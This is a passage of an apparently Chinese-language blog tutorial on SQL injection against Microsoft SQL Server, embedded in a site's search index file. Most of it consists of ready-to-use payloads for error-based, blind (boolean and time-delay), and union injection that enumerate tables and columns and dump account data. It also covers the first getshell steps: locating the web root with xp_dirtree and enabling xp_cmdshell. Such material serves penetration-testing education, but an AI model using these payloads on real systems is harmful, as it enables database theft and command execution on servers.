+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM Fanmv_Admin WHERE AdminID=1 and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name = &#x27;Fanmv_Admin&#x27;));</span><br><span class="line">查询字段名的具体步骤</span><br><span class="line">?id=1 and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name = &#x27;fsb_accounts&#x27;));--</span><br><span class="line">//尝试从sysobjects中获取fsb_accounts的ID，然后从syscolumns中获取该表的第一个字段名</span><br><span class="line">//然后逐步排除字段找到我们想要的字段名</span><br><span class="line">?id=1 and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name = &#x27;fsb_accounts&#x27;) and name&lt;&gt;&#x27;account_no&#x27;);--</span><br><span class="line">?id=1 and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name = &#x27;fsb_accounts&#x27;) and name&lt;&gt;&#x27;account_no&#x27; and name&lt;&gt;&#x27;account_type&#x27;);--</span><br><span class="line">?id=1 and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name = &#x27;fsb_accounts&#x27;) and name&lt;&gt;&#x27;account_no&#x27; and name&lt;&gt;&#x27;account_type&#x27; and name&lt;&gt;&#x27;balance_amount&#x27;);--</span><br></pre></td></tr></table></figure>
+
+<p>爆破数据</p>
+<p>在将 varchar 值 ‘81FAAEN52MA16VBYT4Y1JJ3552BTC1640E7CF84345C86BA6’ 转换成数据类型 int 时失败。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM Fanmv_Admin WHERE AdminID=1 and 1=(SELECT TOP 1 AdminPass from Fanmv_Admin);</span><br><span class="line">查询数据的具体步骤</span><br><span class="line">?id=1 and 1=(select top 1 branch from fsb_accounts);--</span><br><span class="line">//尝试从表 fsb_accounts 中获取第一个 branch 列的值。通过 select top 1 子句，它只返回结果集中的第一个值。</span><br><span class="line">?id=1 and 1=(select top 1 branch from fsb_accounts where branch&lt;&gt;&#x27;Texas-Remington Circle&#x27;);--</span><br><span class="line">//排除了 branch 列值为 &#x27;Texas-Remington Circle&#x27; 的记录，只返回除此之外的第一个 branch 列的值。</span><br><span class="line">?id=1 and 1=(select top 1 branch from fsb_accounts where branch not in (&#x27;Texas-Remington Circle&#x27;, &#x27;Mahnattan - New york&#x27;));--</span><br><span class="line">//除了排除 &#x27;Texas-Remington Circle&#x27; 外，还排除了 &#x27;Mahnattan - New york&#x27;，然后返回除这两个值之外的第一个 branch 列的值。</span><br></pre></td></tr></table></figure>
+
+<p>当然，在mssql中除了借助 <code>sysobjects</code> 表和 <code>syscolumns</code> 表获取表名、列名外，MSSQL 数据库中也兼容 <code>information_schema</code>，里面存放了数据表表名和字段名。使用方法与 MySQL 相同。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/* 查询表名可以用 information_schema.tables */</span><br><span class="line">?id=1 and 1=(select top 1 table_name from information_schema.tables);--</span><br><span class="line">/* 查询列名可以用 information_schema.columns */</span><br><span class="line">?id=1 and 1=(select top 1 column_name from information_schema.columns where table_name=&#x27;fsb_accounts&#x27;);--</span><br></pre></td></tr></table></figure>
+
+<p>我们要判断当前的表名和列名，也可以用<code>having 1=1</code> 和 <code>group by</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM Fanmv_Admin WHERE AdminID=1 having 1=1</span><br></pre></td></tr></table></figure>
+
+<p>选择列表中的列 ‘Fanmv_Admin.AdminID’ 无效，因为该列没有包含在聚合函数或 GROUP BY 子句中。</p>
+<p>爆出一列，将其用group by 拼接进去继续往后爆其他的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM Fanmv_Admin WHERE AdminID=1 GROUP BY AdminID having 1=1</span><br></pre></td></tr></table></figure>
+
+<p>选择列表中的列 ‘Fanmv_Admin.IsSystem’ 无效，因为该列没有包含在聚合函数或 GROUP BY 子句中。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM Fanmv_Admin WHERE AdminID=1 GROUP BY AdminID,IsSystem having 1=1</span><br></pre></td></tr></table></figure>
+
+<p>选择列表中的列 ‘Fanmv_Admin.AdminName’ 无效，因为该列没有包含在聚合函数或 GROUP BY 子句中。</p>
+<p>以此爆出所有字段</p>
+<h3 id="mssql报错注入"><a href="#mssql报错注入" class="headerlink" title="mssql报错注入"></a>mssql报错注入</h3><p>其实上面已经讲到了报错注入的一些基本用法，但是这里还是得把概念理清楚</p>
+<p>MSSQL 数据库是强类型语言数据库，当类型不一致时将会报错，配合子查询即可实现报错注入。前提是服务器允许返回报错信息。报错注入利用的就是显式或隐式的类型转换来报错</p>
+<p>先看隐式报错</p>
+<p>隐式报错（Implicit Error）是指在代码执行过程中发生错误，但这些错误并不会显式地抛出异常或产生明确的错误消息。相反，这些错误可能会导致程序出现不可预料的行为或结果</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from admin where id =1 and (select user)&gt;0</span><br></pre></td></tr></table></figure>
+
+<p>user和0进行比较时因为数据类型不一致就会报错</p>
+<p>再看显式报错，显式报错（Explicit Error）是指通过有意设置错误条件来产生错误消息的情况。</p>
+<p>一般显式报错中我们会用<code>cast</code>和<code>convert</code>函数去有意的设置错误条件达到报错注入的目的</p>
+<p>在SQL中，CAST和CONVERT函数都用于将一个数据类型转换为另一个数据类型</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from admin where id =1 (select CAST(USER as int))</span><br><span class="line">select * from admin where id =1 (select convert(int,user))</span><br></pre></td></tr></table></figure>
+
+<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>其实和mysql的一样，通过设置判断条件并通过页面的回显信息去判断条件是否符合来达到注入的效果</p>
+<p>布尔盲注</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1 and ascii(substring((select top 1 name from master.dbo.sysdatabases),1,1)) &gt;= 109</span><br></pre></td></tr></table></figure>
+
+<p>布尔盲注没有mssql那么多姿势，大同小异截取字符串比较，通过判断条件去拿到真实的内容</p>
+<p>时间盲注</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1;if (select IS_SRVROLEMEMBER(&#x27;sysadmin&#x27;))=1 waitfor delay &#x27;0:0:5&#x27;--</span><br><span class="line">?id=1;if (ascii(substring((select top 1 name from master.dbo.sysdatabases),1,1)))&gt;1 waitfor delay &#x27;0:0:5&#x27;--</span><br></pre></td></tr></table></figure>
+
+<p><code>waitfor delay &#39;0:0:5&#39;</code>是mssql的延时语法</p>
+<p>但是mssql的盲注还是相对来说简单很多的</p>
+<h3 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h3><p>mssql不用数字占位，因为可能会发生隐式转换，我们用null来占位</p>
+<p>在mysql中，爆数据库我们通常是这样去做的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1 union select 1,2,database()#</span><br></pre></td></tr></table></figure>
+
+<p>但是在mssql中我们就得稍微变一下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1 union select null,null,DB_NAME();</span><br><span class="line">也可以通过这样去联合报错</span><br><span class="line">?id=1 union select null,null, (select CAST(db_name() as int))</span><br></pre></td></tr></table></figure>
+
+<p>在mssql中我们如果想查询多条数据可以使用%2B 也就是加号</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1 union select null,name%2Bpass,null from info</span><br></pre></td></tr></table></figure>
+
+<h3 id="getshell和提权"><a href="#getshell和提权" class="headerlink" title="getshell和提权"></a>getshell和提权</h3><h4 id="1-getshell"><a href="#1-getshell" class="headerlink" title="1.getshell"></a>1.getshell</h4><p>getshell也就涉及到了权限的问题，能否getshell要看你当前的用户权限，如果是没有进行降权的sa用户，那么你几乎可以做任何事。它数据库权限是<code>db_owner</code>，当然你如果有其他具有do_owner权限的用户也可以。</p>
+<p>所以我们getshell的两大前提:</p>
+<ul>
+<li>有相应的权限db_owner</li>
+<li>知道web目录的绝对路径</li>
+</ul>
+<p>那我们先讲一下怎么拿到目录的绝对路径</p>
+<h5 id="1-1寻找绝对路径"><a href="#1-1寻找绝对路径" class="headerlink" title="1.1寻找绝对路径"></a>1.1寻找绝对路径</h5><p>寻找绝对目录一般有以下几个思路</p>
+<ol>
+<li><p>报错寻找 </p>
+</li>
+<li><p>字典猜</p>
+</li>
+<li><p>旁站信息收集</p>
+</li>
+<li><p>调用储存过程来搜索</p>
+</li>
+<li><p>读配置文件</p>
+</li>
+</ol>
+<p>前三种方法都是比较常见的方法。我们主要来讲第四种调用存储过程来搜索。</p>
+<p>在mssql中有两个存储过程可以帮我们来找绝对路径：<code>xp_cmdshell xp_dirtree</code></p>
+<p>我们一个个进行讲解</p>
+<ul>
+<li>xp_dirtree</li>
+</ul>
+<p>在SQL Server中，xp_dirtree是一个扩展存储过程，用于从指定路径中检索所有子文件和子目录的列表。它返回一个结果集，其中包含指定路径下所有子文件和子目录的详细信息。</p>
+<p>以下是xp_dirtree的一般用法：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">execute master..xp_dirtree &#x27;c:&#x27; --列出所有c:\文件、目录、子目录 </span><br><span class="line">execute master..xp_dirtree &#x27;c:&#x27;,1 --只列c:\目录</span><br><span class="line">execute master..xp_dirtree &#x27;c:&#x27;,1,1 --列c:\目录、文件</span><br></pre></td></tr></table></figure>
+
+<p>那么我们怎么利用呢，执行xp_dirtree返回我们传入的参数如果你想把文件名一起返回来，因为没有回显所以可以这样创建一个临时的表插入</p>
+<ul>
+<li>xp_cmdshell</li>
+</ul>
+<p><code>xp_cmdshell</code> 存储过程可以生成并执行 Windows 命令，任何输出都作为文本返回。<code>xp_cmdshell</code> 功能非常强大，但是从 MSSQL 2005 版本之后默认处于禁用状态，可以执行 <code>sp_configure</code> 来启用或禁用 <code>xp_cmdshell</code>。</p>
+<p><code>xp_cmdshell</code> 的利用条件如下：</p>
+<ul>
+<li>• 当前用户具有 DBA 权限</li>
+<li>• 依赖于 xplog70.dll</li>
+<li>• <code>xp_cmdshell</code> 存储过程存在并已启用</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/* 判断当前是否为 DBA 权限，返回 1 则可以提权 */</span><br><span class="line">SELECT IS_SRVROLEMEMBER(&#x27;sysadmin&#x27;);</span><br><span class="line"></span><br><span class="line">/* 查看是否存在 xp_cmdshell，返回 1 则存在 */</span><br><span class="line">SELECT COUNT(*) FROM master.dbo.sysobjects WHERE xtype=&#x27;x&#x27; AND name=&#x27;xp_cmdshell&#x27;</span><br><span class="line"></span><br><span class="line">/* 开启 xp_cmdshell */</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;RECONFIGURE;EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;RECONFIGURE;</span><br><span class="line"></span><br><span class="line">/* 关闭 xp_cmdshell */</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;RECONFIGURE;EXEC sp_configure &#x27;xp_cmdshell&#x27;, 0;RECONFIGURE;</span><br></pre></td></tr></table></figure>
+
+
+
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
       </tags>
   </entry>
 </search>
